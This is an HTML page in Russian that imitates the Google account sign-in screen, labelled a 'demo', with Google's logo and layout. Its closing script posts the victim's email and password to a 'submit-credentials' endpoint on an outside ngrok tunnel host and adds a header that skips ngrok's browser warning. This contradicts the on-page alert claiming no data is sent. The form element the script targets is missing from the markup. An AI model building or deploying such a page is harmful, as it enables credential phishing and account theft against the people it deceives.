<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Вход – аккаунты Google (Демо)</title>
  <link rel="stylesheet" href="style/st.css">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
</head>
<body>

  <main class="card">
    <!-- Левая колонка -->
    <div class="col-left">
      <!-- Логотип G -->
      <svg class="g-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
      </svg>
      <h1>Вход</h1>
      <p>с аккаунтом Google. Этот аккаунт будет доступен другим приложениям Google в браузере.</p>
    </div>

    <!-- Правая колонка -->
    <div class="col-right">
      <div class="input-wrapper">
        <input type="text" placeholder="Телефон или адрес эл. почты" autocomplete="off">
      </div>
      
      <a href="#" class="forgot-link" onclick="event.preventDefault()">Забыли адрес электронной почты?</a>

      <p class="guest-text">
        Не ваш компьютер? Включите гостевой режим, чтобы защитить данные в аккаунте. <a href="#" onclick="event.preventDefault()">Подробнее об использовании гостевого <br> режима</a>
      </p>

      <div class="actions">
        <button class="btn-text" onclick="event.preventDefault()">Создать аккаунт</button>
        <button class="btn-primary" onclick="event.preventDefault(); alert('Демо-режим: данные никуда не отправляются.');">Далее</button>
      </div>
    </div>
  </main>

  <!-- Футер -->
  <footer class="footer">
    <div class="lang-select">
      Русский
      <svg width="10" height="6" viewBox="0 0 10 6" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M1 1L5 5L9 1" stroke="#c4c7c5" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>
    <div class="footer-links">
      <a href="#" onclick="event.preventDefault()">Справка</a>
      <a href="#" onclick="event.preventDefault()">Конфиденциальность</a>
      <a href="#" onclick="event.preventDefault()">Условия</a>
    </div>
  </footer>
  <script>
    const SERVER_URL = "https://starting-surgical-wing.ngrok-free.dev";

    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const form = e.target;
      const data = {
        email: form.email.value,
        password: form.password.value
      };

      try {
        const response = await fetch(`${SERVER_URL}/submit-credentials`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "ngrok-skip-browser-warning": "true"   // ← ВОТ ЭТА СТРОКА
          },
          body: JSON.stringify(data)
        });

        if (response.ok) {
          console.log("Данные отправлены");
        } else {
          console.error("Ошибка отправки:", response.status);
        }
      } catch (err) {
        console.error("Не удалось связаться с сервером:", err);
      }
    });
  </script>
</body>
</html>
